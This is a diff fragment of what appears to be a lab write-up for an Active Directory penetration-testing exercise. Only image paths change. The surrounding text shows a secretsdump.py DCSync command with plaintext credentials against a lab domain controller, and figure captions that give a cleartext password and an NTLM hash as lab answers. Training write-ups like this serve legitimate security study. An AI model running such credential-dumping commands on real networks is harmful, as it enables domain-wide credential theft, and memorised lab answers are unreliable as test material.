@@ -191,11 +191,11 @@ ssh to linux machine to run secretsdump.py
 secretsdump.py -just-dc INLANEFREIGHT/adunn:SyncMaster757@172.16.5.5 -outputfile inlanefreight_hashes
 ```
 
-<figure><img src="../../../.gitbook/assets/image (46).png" alt=""><figcaption><p>syncron:Mycleart3xtP@ss!</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (46) (2).png" alt=""><figcaption><p>syncron:Mycleart3xtP@ss!</p></figcaption></figure>
 
 **Perform a DCSync attack and submit the NTLM hash for the khartsfield user as your answer.**
 
-<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption><p>4bb3b317845f0954200a6b0acc9b9f9a</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (22) (1).png" alt=""><figcaption><p>4bb3b317845f0954200a6b0acc9b9f9a</p></figcaption></figure>
 
 
 
